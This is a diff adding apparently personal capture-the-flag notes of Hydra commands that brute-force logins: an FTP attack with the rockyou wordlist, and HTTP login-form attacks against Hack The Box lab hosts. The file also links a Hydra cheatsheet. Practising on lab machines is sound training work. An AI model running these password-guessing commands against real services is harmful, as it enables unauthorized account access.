@@ -1,0 +1,15 @@
+hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
+
+
+https://github.com/frizb/Hydra-Cheatsheet
+
+
+
+hydra -L ./user.txt -P ./pass.txt product.player2.htb http-post-form "/:username=^USER^&password=^PASS^&Submit=Sign+in:alert
+
+
+hydra -C userpass.txt product.player2.htb http-post-form "/index:username=^USER^&password=^PASS^&Submit=Sign in:Nope"
+use user:pass creds
+
+hydra -l 'pain' -P /usr/share/wordlists/rockyou.txt backup.forwardslash.htb http-post-form "/login.php:username=^USER^&password=^PASS^&sign+in:The password you entered was not valid."
+
